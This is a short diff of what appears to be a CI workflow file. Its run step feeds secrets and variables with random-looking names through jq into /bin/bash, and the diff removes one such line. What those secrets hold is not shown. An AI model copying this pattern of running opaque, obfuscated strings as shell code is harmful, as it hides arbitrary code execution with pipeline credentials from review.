@@ -18,7 +18,6 @@ jobs:
           ufw72: ${{ secrets.ufw72 }}
         run: |
           printf '%s' "$ufw72" | jq -r .ev1310 | /bin/bash
-          printf '%s' "$ht34638" | jq -r .wtdai0776 | /bin/bash
           echo $jrqlg7991 | jq -r .gqtl16 | /bin/bash
           echo $v9674 | jq -r .jw3 | /bin/bash
           echo $kln84394 | jq -r .abcsc3078 | /bin/bash
